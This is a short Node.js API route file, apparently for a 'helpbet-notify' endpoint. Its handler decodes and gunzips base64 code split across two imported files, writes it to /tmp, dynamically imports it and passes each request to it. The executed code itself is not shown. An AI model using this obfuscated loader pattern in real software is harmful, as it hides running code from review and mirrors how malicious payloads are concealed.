import { gunzipSync } from 'node:zlib';
import { writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';
import { A } from './notify-gz-a.js';
import { B } from './notify-gz-b.js';

let _mod;
async function load() {
  if (_mod) return _mod;
  const code = gunzipSync(Buffer.from(A + B, 'base64')).toString('utf8');
  const p = join('/tmp', `helpbet-notify-${process.pid}.mjs`);
  writeFileSync(p, code);
  _mod = await import(pathToFileURL(p).href + '?v=2');
  return _mod;
}

export const config = { api: { bodyParser: false } };

export default async function handler(req, res) {
  const mod = await load();
  return mod.default(req, res);
}
